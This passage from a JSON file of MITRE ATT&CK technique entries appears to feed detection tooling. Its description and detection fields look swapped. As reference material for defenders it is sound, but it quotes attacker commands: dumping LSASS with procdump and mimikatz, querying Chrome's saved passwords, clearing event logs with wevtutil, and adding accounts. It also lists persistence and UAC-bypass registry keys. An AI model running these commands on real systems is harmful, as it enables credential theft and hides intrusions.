                "description": "Changes to service Registry entries and command line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [PsExec](https://attack.mitre.org/software/S0029).",
                "detection": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and Net.\n\nPsExec can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with Windows Service during service persistence or privilege escalation.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1059.006",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Python",
                "chain_phase": "execution",
                "description": "Monitor systems for abnormal Python usage and python.exe behavior, which could be an indicator of malicious activity. Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.",
                "detection": "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1059.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "PowerShell",
                "chain_phase": "execution",
                "description": "If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nMonitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.(Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.",
                "detection": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.  Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1497.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "System Checks",
                "chain_phase": "defense-evasion",
                "description": "Virtualization/sandbox related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.",
                "detection": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. \n\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. \n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1087.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Local Account",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nMonitor for processes that can be used to enumerate user accounts, such as <code>net.exe</code> and <code>net1.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)",
                "detection": "Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as <code>net user</code> and <code>net localgroup</code> of the Net utility and <code>id</code> and <code>groups</code>on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1003.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "LSA Secrets",
                "chain_phase": "credential-access",
                "description": "Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.",
                "detection": "Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts. LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>. LSA secrets can also be dumped from memory.\n\nReg can be used to extract from the Registry. Mimikatz can be used to extract secrets from memory.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1003.005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Cached Domain Credentials",
                "chain_phase": "credential-access",
                "description": "Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nDetection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well.",
                "detection": "Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.\n\nOn Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash. The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires Password Cracking to recover the plaintext password.\n\nWith SYSTEM access, the tools/utilities such as Mimikatz, Reg, and secretsdump.py can be used to extract the cached credentials.\n\nNote: Cached credentials for Windows Vista are derived using PBKDF2.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1560.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Archive via Utility",
                "chain_phase": "collection",
                "description": "Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\n\nConsider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)",
                "detection": "An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities. Many utilities exist that can archive data, including 7-Zip, WinRAR, and WinZip. Most utilities include functionality to encrypt and/or compress data.\n\nSome 3rd party utilities may be preinstalled, such as `tar` on Linux and macOS or `zip` on Windows systems.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1114.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Local Email Collection",
                "chain_phase": "collection",
                "description": "Monitor processes and command-line arguments for actions that could be taken to gather local email files. Monitor for unusual processes accessing local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.\n\nOutlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB. IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\\Users\\<username>\\Documents\\Outlook Files` or `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook`.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1134.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Token Impersonation/Theft",
                "chain_phase": "defense-evasion",
                "description": "If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nAnalysts can also monitor for use of Windows APIs such as <code>DuplicateToken(Ex)</code>, <code> ImpersonateLoggedOnUser </code>, and <code> SetThreadToken </code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.",
                "detection": "Adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using <code>DuplicateToken(Ex)</code>. The token can then be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread to impersonate a logged on user's security context, or with <code>SetThreadToken</code> to assign the impersonated token to a thread.\n\nAn adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1555.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Credentials from Web Browsers",
                "chain_phase": "credential-access",
                "description": "Identify web browser files that contain credentials such as Google Chrome’s Login Data database file: <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code>. Monitor file read events of web browser files that contain credentials, especially when the reading process is unrelated to the subject web browser. Monitor process execution logs to include PowerShell Transcription focusing on those that perform a combination of behaviors including reading web browser process memory, utilizing regular expressions, and those that contain numerous keywords for common web applications (Gmail, Twitter, Office365, etc.).",
                "detection": "Adversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key. \n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the Windows Credential Manager.\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1557.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "LLMNR/NBT-NS Poisoning and SMB Relay",
                "chain_phase": "credential-access",
                "description": "Monitor <code>HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient</code> for changes to the \"EnableMulticast\" DWORD value. A value of “0” indicates LLMNR is disabled. (Citation: Sternsecurity LLMNR-NBTNS)\n\nMonitor for traffic on ports UDP 5355 and UDP 137 if LLMNR/NetBIOS is disabled by security policy.\n\nDeploy an LLMNR/NBT-NS spoofing detection tool.(Citation: GitHub Conveigh) Monitoring of Windows event logs for event IDs 4697 and 7045 may help in detecting successful relay techniques.(Citation: Secure Ideas SMB Relay)",
                "detection": "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.  \n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing and crack the hashes offline through Brute Force to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. \n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and Responder.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1555",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Credentials from Password Stores",
                "chain_phase": "credential-access",
                "description": "Monitor system calls, file read events, and processes for suspicious activity that could indicate searching for a password  or other activity related to performing keyword searches (e.g. password, pwd, login, store, secure, credentials, etc.) in process memory for credentials. File read events should be monitored surrounding known password storage applications.",
                "detection": "Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1003.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "LSASS Memory",
                "chain_phase": "credential-access",
                "description": "Monitor for unexpected processes interacting with LSASS.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.\n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.",
                "detection": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1021.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Remote Desktop Protocol",
                "chain_phase": "lateral-movement",
                "description": "Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.",
                "detection": "Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the Accessibility Features technique for Persistence.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1552.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Credentials In Files",
                "chain_phase": "credential-access",
                "description": "While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [Valid Accounts](https://attack.mitre.org/techniques/T1078) for more information.",
                "detection": "Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through OS Credential Dumping.  Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. \n\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files. They may also be found as parameters to deployment commands in container logs. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Containers"
                ]
            }
        },
        {
            "id": "T1550.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Pass the Ticket",
                "chain_phase": "defense-evasion",
                "description": "Audit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.\n\nEvent ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to \"Integrity check on decrypted field failed\" and indicates misuse by a previously invalidated golden ticket.(Citation: CERT-EU Golden Ticket Protection)",
                "detection": "Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\n\nWhen preforming PtT, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.\n\nA Silver Ticket can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).\n\nA Golden Ticket can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.\n\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. Pass the Hash) while also using the password hash to create a valid Kerberos ticket.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1548.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Bypass User Account Control",
                "chain_phase": "privilege-escalation",
                "description": "There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), which indicate attempts to gain access to higher privileged processes.\n\nSome UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:\n\n* The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Classes\\mscfile\\shell\\open\\command</code> Registry key.(Citation: enigma0x3 Fileless UAC Bypass)\n\n* The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe</code> and <code>[HKEY_CURRENT_USER]\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand</code> Registry keys.(Citation: enigma0x3 sdclt app paths)(Citation: enigma0x3 sdclt bypass)\n\nAnalysts should monitor these Registry settings for unauthorized changes.",
                "detection": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. \n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box.   An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1070.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Clear Windows Event Logs",
                "chain_phase": "defense-evasion",
                "description": "Deleting Windows event logs (via native binaries (Citation: Microsoft wevtutil Oct 2017), API functions (Citation: Microsoft EventLog.Clear), or [PowerShell](https://attack.mitre.org/techniques/T1059/001) (Citation: Microsoft Clear-EventLog)) may also generate an alterable event (Event ID 1102: \"The audit log was cleared\").",
                "detection": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\nThe event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or PowerShell.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1136.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Domain Account",
                "chain_phase": "persistence",
                "description": "Monitor for processes and command-line parameters associated with domain account creation, such as <code>net user /add /domain</code>. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows domain controller. (Citation: Microsoft User Creation Event) Perform regular audits of domain accounts to detect suspicious accounts that may have been created by an adversary.",
                "detection": "Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1136.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Local Account",
                "chain_phase": "persistence",
                "description": "Monitor for processes and command-line parameters associated with local account creation, such as <code>net user /add</code> or <code>useradd</code>. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system. (Citation: Microsoft User Creation Event) Perform regular audits of local system accounts to detect suspicious accounts that may have been created by an adversary.",
                "detection": "Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. With a sufficient level of access, the <code>net user /add</code> command can be used to create a local account.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1547.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Registry Run Keys / Startup Folder",
                "chain_phase": "persistence",
                "description": "Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. (Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
                "detection": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.  These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.  For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add 